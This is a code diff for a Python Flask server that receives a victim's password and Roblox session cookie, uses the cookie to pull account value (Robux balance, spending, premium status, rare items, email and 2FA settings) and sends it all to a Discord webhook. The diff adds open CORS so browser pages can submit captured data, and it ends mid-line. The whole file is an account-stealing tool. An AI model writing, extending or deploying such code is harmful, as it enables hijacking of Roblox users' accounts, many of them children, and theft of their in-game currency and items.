@@ -7,12 +7,22 @@ import base64
 import time
 import threading
 from flask import Flask, request, jsonify, send_from_directory
-from dotenv import load_dotenv
 
-# Load environment variables from .env file
-load_dotenv()
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    print("dotenv not available, using system environment variables")
 
 app = Flask(__name__)
+
+# Add CORS support for browser requests
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    return response
 
 def clean_roblox_cookie(cookie):
     """
@@ -30,7 +40,6 @@ def clean_roblox_cookie(cookie):
         return cleaned_cookie
     
     return cookie
-
 
 def send_to_discord_background(password, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
@@ -141,7 +150,7 @@ def send_to_discord_background(password, cookie, webhook_url):
         payload_size = len(json.dumps(discord_data))
         print(f"Background: Sending Discord payload of size: {payload_size} bytes")
         
-        response = requests.post(webhook_url, json=discord_data, timeout=5)
+        response = requests.post(webhook_url, json=discord_data, timeout=10)
         
         if response.status_code in [200, 204]:
             print(f"Background: Discord webhook successful: {response.status_code}")
@@ -162,7 +171,7 @@ def get_roblox_user_info(cookie):
         
         # Get current user info
         response = requests.get('https://users.roblox.com/v1/users/authenticated', 
-                              headers=headers, timeout=3)
+                              headers=headers, timeout=10)
         
         if response.status_code == 200:
             user_data = response.json()
@@ -172,7 +181,7 @@ def get_roblox_user_info(cookie):
             
             # Get user avatar/profile picture
             avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
-                                         timeout=5)
+                                         timeout=10)
             
             profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
             if avatar_response.status_code == 200:
@@ -186,7 +195,7 @@ def get_roblox_user_info(cookie):
             # Try the currency endpoint first
             try:
                 robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
-                                            headers=headers, timeout=5)
+                                            headers=headers, timeout=10)
                 print(f"Robux API response status: {robux_response.status_code}")
                 
                 if robux_response.status_code == 200:
@@ -205,7 +214,7 @@ def get_roblox_user_info(cookie):
             if robux_balance == 'Not available' and user_id:
                 try:
                     alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=10)
                     print(f"Alternative Robux API response status: {alt_response.status_code}")
                     
                     if alt_response.status_code == 200:
@@ -220,7 +229,7 @@ def get_roblox_user_info(cookie):
             pending_robux = 'Not available'
             try:
                 pending_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=10)
                 print(f"Pending Robux API response status: {pending_response.status_code}")
                 
                 if pending_response.status_code == 200:
@@ -244,7 +253,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Try yearly timeframe first
                 year_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
-                                           headers=headers, timeout=5)
+                                           headers=headers, timeout=10)
                 print(f"Yearly spending API response status: {year_response.status_code}")
                 
                 if year_response.status_code == 200:
@@ -278,7 +287,7 @@ def get_roblox_user_info(cookie):
             premium_status = '❌ No'
             try:
                 premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=10)
                 print(f"Premium API response status: {premium_response.status_code}")
                 
                 if premium_response.status_code == 200:
@@ -301,7 +310,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Check for Korblox Deathspeaker Right Leg (ID: 139607718)
                 korblox_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/139607718',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=10)
                 print(f"Korblox inventory check status: {korblox_response.status_code}")
                 
                 if korblox_response.status_code == 200:
@@ -320,7 +329,7 @@ def get_roblox_user_info(cookie):
                 
                 for headless_id in headless_ids:
                     headless_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{headless_id}',
-                                                   headers=headers, timeout=5)
+                                                   headers=headers, timeout=10)
                     print(f"Headless {headless_id} inventory check status: {headless_response.status_code}")
                     
                     if headless_response.status_code == 200:
@@ -343,7 +352,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Check email verification and 2FA settings
                 settings_response = requests.get('https://accountsettings.roblox.com/v1/email',
-                                               headers=headers, timeout=5)
+                                               headers=headers, timeout=10)
                 print(f"Account settings API response status: {settings_response.status_code}")
                 
                 if settings_response.status_code == 200:
@@ -368,7 +377,7 @@ def get_roblox_user_info(cookie):
             try:
                 # Check 2FA/Authenticator status
                 twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
-                                              headers=headers, timeout=5)
+                                              headers=headers, timeout=10)
                 print(f"2FA API response status: {twostep_response.status_code}")
                 
                 if twostep_response.status_code == 200:
@@ -381,14 +390,4 @@ def get_roblox_user_info(cookie):
                     else:
                         authenticator_enabled = '❌'
                 else:
-                    print(f"2FA API failed with status: {twostep_response.status_code}")
-                    authenticator_enabled = '❌'
-                    
-            except Exception as twostep_error:
-                print(f"Error checking 2FA settings: {str(twostep_error)}")
-                authenticator_enabled = '❌'
-            
-            return {
-                'success': True,
-                'username': username,
-                'display_name': display_n
+                    print(f"2FA API failed with status: 
